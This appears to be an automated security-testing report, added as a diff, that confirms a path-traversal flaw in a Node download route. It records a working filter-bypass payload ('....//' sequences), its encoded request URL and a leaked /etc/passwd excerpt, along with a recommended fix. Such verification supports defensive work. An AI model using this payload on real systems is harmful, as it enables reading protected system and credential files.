@@ -1,0 +1,45 @@
+{
+  "exploited": true,
+  "vulnerability": "Path traversal (filter bypass)",
+  "sast": {
+    "rule": "opengrep-rules.vuln-target-path-traversal",
+    "file": "routes/download.js",
+    "line": 21,
+    "cwe": "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+  },
+  "route": "/download",
+  "param": "file",
+  "auth_required": true,
+  "authenticated_as": "alice",
+  "safeguard_present": true,
+  "reviewed_by": "claude-opus-4-8",
+  "assessment": "vulnerable",
+  "weakness_class": "non_recursive_strip",
+  "llm_analysis": "The single-pass replace of traversal sequences allows overlapping patterns to collapse back into valid traversal after removal, and there is no canonicalization check confining the path to UPLOADS.",
+  "recommended_fix": "Resolve the final path with path.resolve and verify it starts with the UPLOADS directory before reading, rather than relying on string stripping.",
+  "controls": {
+    "benign_file": {
+      "value": "readme.txt",
+      "status": 200,
+      "leaked": false
+    },
+    "naive_traversal": {
+      "value": "../../../../etc/passwd",
+      "leaked": false,
+      "note": "blocked by the safeguard"
+    }
+  },
+  "attempts": [
+    {
+      "payload": "....//....//....//....//....//....//....//....//etc/passwd",
+      "status": 200,
+      "leaked": true
+    }
+  ],
+  "winning_payload": "....//....//....//....//....//....//....//....//etc/passwd",
+  "evidence": {
+    "url": "http://vuln-target:3000/download?file=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd",
+    "passwd_excerpt": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin"
+  },
+  "generated": "2026-10-27T02:40:58.550Z"
+}
